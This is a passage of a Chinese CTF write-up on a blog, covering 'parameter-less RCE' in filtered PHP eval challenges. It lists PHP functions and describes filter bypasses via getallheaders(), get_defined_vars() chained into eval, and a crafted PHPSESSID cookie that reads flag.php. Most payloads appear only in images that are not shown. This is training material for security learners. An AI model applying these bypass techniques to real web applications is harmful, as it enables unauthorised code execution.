+<p>先来总结一下这种题目的思路：<br>首先我们先看一下过滤了哪些函数，还有哪些关键字。很多时候会过滤读文件的，我们可以先fuzz一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(get_defined_functions());?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后呢就是想方设法“套娃”来RCE，或者进行目录遍历了。<br>列一下常用函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件</span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br></pre></td></tr></table></figure>
+
+<p>前面呢因为正则过滤还有好几种方法没提，这里来讲一下：<br>上面的目录遍历形式的没有环境区别，我们这里来分一下环境：</p>
+<h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>getallheaders()函数<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180538368-1134993250.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180538368-1134993250.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180547719-1521326091.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180547719-1521326091.png"
+                      alt="img"
+                ></a></p>
+<p>先通过头部传入恶意数据，之后我们再取出来：<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180556214-286681138.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180556214-286681138.png"
+                      alt="img"
+                ></a></p>
+<p>成功RCE</p>
+<h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>get_defined_vars()函数<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180603439-1208560909.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180603439-1208560909.png"
+                      alt="img"
+                ></a></p>
+<p>我们可以通过定义新的变量来控制该函数的返回值<br>然后变成我们想要执行的代码，例如phpinfo();<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180610092-1006957565.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180610092-1006957565.png"
+                      alt="img"
+                ></a></p>
+<p>然后我们现在要想办法将我们想执行的代码从数组中提取出来<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180616545-582547896.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180616545-582547896.png"
+                      alt="img"
+                ></a></p>
+<p>先用current函数取出get键值所对应的值，然后再利用array_values函数将数组的值重新组成一个数组，再次利用current函数取出数组第一个值，将var_dump改成eval即可实现RCE<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180625929-1191150283.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180625929-1191150283.png"
+                      alt="img"
+                ></a></p>
+<h4 id="除了这两个，我们也可以通过session-id-session-start-，上面也已经提过"><a href="#除了这两个，我们也可以通过session-id-session-start-，上面也已经提过" class="headerlink" title="除了这两个，我们也可以通过session_id(session_start())，上面也已经提过"></a>除了这两个，我们也可以通过session_id(session_start())，上面也已经提过</h4><p>题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。session_id()可以获取到当前的session id。因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php<br><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180634547-1893645688.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180634547-1893645688.png"
+                      alt="img"
+                ></a></p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180643916-1652214157.png"><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200215180643916-1652214157.png"
+                      alt="img"
+                ></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">无参数RCE</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">liduoan.efls</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2020-04-03 21:20:59</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2020/04/03/四月/无参数RCE/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2020/04/08/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8-2/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">四月份安全-2</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2020/04/01/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">四月份web-1.0</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">三种方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E4%BB%AC%E5%86%8D%E6%9D%A5%E7%9C%8B%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">我们再来看一个题目：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2019%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-decade"><span class="nav-number">3.</span> <span class="nav-text">2019上海市大学生网络安全大赛_decade</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#apache"><span class="nav-number">3.1.</span> <span class="nav-text">apache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nginx"><span class="nav-number">3.2.</span> <span class="nav-text">nginx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%A4%E4%BA%86%E8%BF%99%E4%B8%A4%E4%B8%AA%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87session-id-session-start-%EF%BC%8C%E4%B8%8A%E9%9D%A2%E4%B9%9F%E5%B7%B2%E7%BB%8F%E6%8F%90%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">除了这两个，我们也可以通过session_id(session_start())，上面也已经提过</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">liduoan.efls</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
